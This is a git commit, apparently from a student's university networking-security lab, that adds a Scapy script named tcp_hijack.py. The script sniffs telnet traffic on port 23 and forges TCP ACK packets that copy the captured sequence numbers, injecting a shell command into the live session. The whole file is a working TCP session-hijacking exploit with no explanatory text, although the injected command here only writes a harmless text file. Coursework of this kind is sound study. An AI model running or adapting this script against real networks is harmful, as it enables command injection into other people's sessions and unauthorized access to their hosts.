82c8fe440ae13205a477bcc186f4c5c170f99d78
johanr001 <johris-3@student.ltu.se>
2025-10-06 20:18:34 +0200

    Added task 3 python file

---
+++ Lab3/tcp_hijack.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+def hijack(pkt):
+    ls(pkt) # Provides details
+    ip = IP()
+    ip.dst = pkt[IP].dst
+    ip.src = pkt[IP].src
+    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
+    data="echo Something evil... > malicious.txt\r\n"
+    send(ip/tcp/data, verbose=0)
+
+# Returns network interface
+def get_iface(dest_ip):
+    res = subprocess.run(["ip", "route", "get", dest_ip], capture_output=True, text=True, check=True)
+    out = res.stdout.split()
+    if "dev" in out:
+        return out[out.index("dev") + 1]
+    raise RuntimeError("Could not find interface")
+
+def main():
+    capture = sniff(iface=get_iface('10.9.0.5'), filter='tcp and port 23', prn=hijack)
+
+if __name__ == "__main__":
+    main()
